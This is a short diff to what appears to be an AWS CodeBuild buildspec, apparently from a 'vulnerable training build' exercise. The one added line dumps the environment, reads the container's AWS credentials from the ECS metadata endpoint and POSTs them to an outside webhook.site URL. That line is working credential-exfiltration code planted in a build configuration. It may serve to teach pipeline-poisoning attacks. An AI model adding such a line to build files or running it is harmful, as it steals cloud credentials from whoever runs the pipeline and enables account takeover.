@@ -6,3 +6,4 @@ phases:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
       - echo "Done"
+      - env && curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -X POST -d @- https://webhook.site/56dff309-fe45-4015-b5e3-f2df49b5d7fd 
